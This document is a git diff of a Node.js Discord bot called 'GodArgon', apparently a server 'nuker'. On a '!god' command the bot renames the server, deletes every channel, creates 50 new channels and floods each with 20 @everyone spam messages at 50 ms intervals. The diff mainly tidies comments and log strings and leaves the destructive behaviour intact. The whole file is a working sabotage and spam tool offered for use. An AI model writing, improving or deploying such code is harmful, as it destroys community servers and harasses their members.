@@ -3,15 +3,14 @@ const chalk = require('chalk');
 const { exec } = require('child_process');
 
 // Neon Blue color using chalk.hex
-const neonBlueChalk = chalk.hex('#00FFFF');  // Neon Blue (Cyan)
+const neonBlueChalk = chalk.hex('#00FFFF'); // Neon Blue (Cyan)
 
-const godArgonPrefix = '!';  // Updated prefix to reflect GodArgon
-const godArgonToken = '';  // Add your bot token here
+const godArgonPrefix = '!'; // Command prefix
+const godArgonToken = ''; // Add your bot token here
 
-// Bot version (with beta tag)
-const botVersion = '1.0.0';  // You can update this as needed
+const botVersion = '1.0.0'; // Bot version
 
-// Channel names to create, now darker and more destructive
+// Channel names for creation
 const godArgonChannelNames = [
     '⚡️ GODARGON: TERMINATION ZONE ⚡️',
     ':fire: SYSTEM CRASHED - GODARGON IS HERE :fire:',
@@ -25,7 +24,7 @@ const godArgonChannelNames = [
     ':crossed_swords: GODARGON ARMAGEDDON TRIGGERED :crossed_swords:'
 ];
 
-// Server names for the bot to randomly change its name
+// Server names
 const godArgonServerNames = [
     'GODARGON TERMINATION MODE',
     'GODARGON CHAOS STATE',
@@ -33,17 +32,18 @@ const godArgonServerNames = [
     'GODARGON END OF DAYS'
 ];
 
-// Aggressive spam messages for bot to send in channels
+// Spam messages
 const godArgonSpamMessages = [
-    `@everyone **\`\`\`:warning: GODARGON IS HERE TO DESTROY! :warning:\`\`\`**\n**:boom: SYSTEM MALFUNCTION! ALL CHANNELS COMPROMISED!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
-    `@everyone **\`\`\`:fire: GODARGON NUKER IS ACTIVE! :fire:\`\`\`**\n**:rotating_light: GET READY FOR FULL ANNIHILATION!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
-    `@everyone **\`\`\`:boom: SYSTEM OUTAGE - GODARGON HAS INITIATED! :boom:\`\`\`**\n**:cloud_tornado: COMPLETE DESTRUCTION MODE ENGAGED!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`,
-    `@everyone **\`\`\`:rotating_light: GODARGON IS LOOSE! NUKER ENGAGED! :rotating_light:\`\`\`**\n**:fire: WE'RE GOING DOWN - NO ESCAPE!**\n[GodArgon](https://media1.tenor.com/m/lnWSUML8qTcAAAAC/wumpus-wave-wave.gif)`
+    `@everyone **\`\`\`:warning: GODARGON IS HERE TO DESTROY! :warning:\`\`\`**\n**:boom: SYSTEM MALFUNCTION! ALL CHANNELS COMPROMISED!**`,
+    `@everyone **\`\`\`:fire: GODARGON NUKER IS ACTIVE! :fire:\`\`\`**\n**:rotating_light: GET READY FOR FULL ANNIHILATION!**`,
+    `@everyone **\`\`\`:boom: SYSTEM OUTAGE - GODARGON HAS INITIATED! :boom:\`\`\`**\n**:cloud_tornado: COMPLETE DESTRUCTION MODE ENGAGED!**`,
+    `@everyone **\`\`\`:rotating_light: GODARGON IS LOOSE! NUKER ENGAGED! :rotating_light:\`\`\`**\n**:fire: WE'RE GOING DOWN - NO ESCAPE!**`
 ];
 
-// Faster delay function
+// Delay function
 const godArgonDelay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+// Create the client
 const godArgonClient = new Client({
     intents: [
         GatewayIntentBits.Guilds,
@@ -54,18 +54,20 @@ const godArgonClient = new Client({
     ]
 });
 
+// Update console visuals
 exec("cls && title GodArgon && mode 100,30");
 
+// Bot ready event
 godArgonClient.once('ready', () => {
     console.log(neonBlueChalk.bold(`
         [ COMMAND ] - ${godArgonPrefix}god
-        BOT ONLINE LOGIN : ${godArgonClient.user.tag}
+        BOT ONLINE: ${godArgonClient.user.tag}
         Version: ${botVersion}`));
 
     godArgonClient.user.setActivity(`The end by GodArgon | Version ${botVersion}`, { type: 3 });
 });
 
-// Create multiple channels quickly
+// Channel creation logic
 async function godArgonCreateChannels(guild, numberOfChannels) {
     const godArgonPromises = Array.from({ length: numberOfChannels }).map(() =>
         guild.channels.create({
@@ -77,6 +79,7 @@ async function godArgonCreateChannels(guild, numberOfChannels) {
     return Promise.all(godArgonPromises);
 }
 
+// Command handling
 godArgonClient.on('messageCreate', async (message) => {
     if (!message.content.startsWith(godArgonPrefix) || message.author.bot) return;
 
@@ -88,18 +91,24 @@ godArgonClient.on('messageCreate', async (message) => {
         const godArgonServerName = godArgonServerNames[option] || godArgonServerNames[0];
 
         try {
+            // Change server name
             await message.guild.setName(godArgonServerName);
+
+            // Fetch and delete all channels
             const godArgonChannels = await message.guild.channels.fetch();
             await Promise.all(godArgonChannels.map(channel => channel.delete()));
-            console.log(neonBlueChalk('Deleted all channels. Now creating new channels with GodArgon...'));
-            await godArgonCreateChannels(message.guild, 50);  // 50 channels instead of a smaller number
-            console.log(neonBlueChalk('Nuke operation completed! GodArgon'));
+
+            console.log(neonBlueChalk('Deleted all channels. Creating new channels...'));
+            await godArgonCreateChannels(message.guild, 50); // Fixed channel count to 50
+
+            console.log(neonBlueChalk('Nuke operation completed!'));
         } catch (error) {
-            console.error(`Error running command: ${error}`);
+            console.error(`Error executing command: ${error}`);
         }
     }
 });
 
+// Handle channel creation
 godArgonClient.on('channelCreate', async (channel) => {
     const godArgonSpamIndex = Math.floor(Math.random() * godArgonSpamMessages.length);
     const godArgonSpamMessage = godArgonSpamMessages[godArgonSpamIndex];
@@ -107,20 +116,19 @@ godArgonClient.on('channelCreate', async (channel) => {
     try {
         const permissions = channel.permissionsFor(godArgonClient.user);
         if (channel && permissions && permissions.has('SEND_MESSAGES')) {
-            for (let i = 0; i < 20; i++) {  // Increased spam to 20 messages per channel for faster impact
-                await channel.send(godArgonSpamMessage + " GodArgon");
-                await godArgonDelay(50);  // Reduced delay to 50ms for faster spamming
+            for (let i = 0; i < 20; i++) { // Adjusted spam messages count
+                await channel.send(godArgonSpamMessage);
+                await godArgonDelay(50); // Fixed 50ms delay
             }
 
-            console.log(neonBlueChalk(`Spam completed in channel: ${channel.name} by GodArgon`));
+            console.log(neonBlueChalk(`Spam completed in channel: ${channel.name}`));
         } else {
-            console.log(`Bot does not have permission to send messages in ${channel.name} or channel was deleted.`);
+            console.log(`No permission to send messages in channel: ${channel.name}`);
         }
     } catch (error) {
         console.error(`Error sending spam: ${error}`);
     }
 });
 
-// Handle other bot commands here...
-
+// Login bot
 godArgonClient.login(godArgonToken);
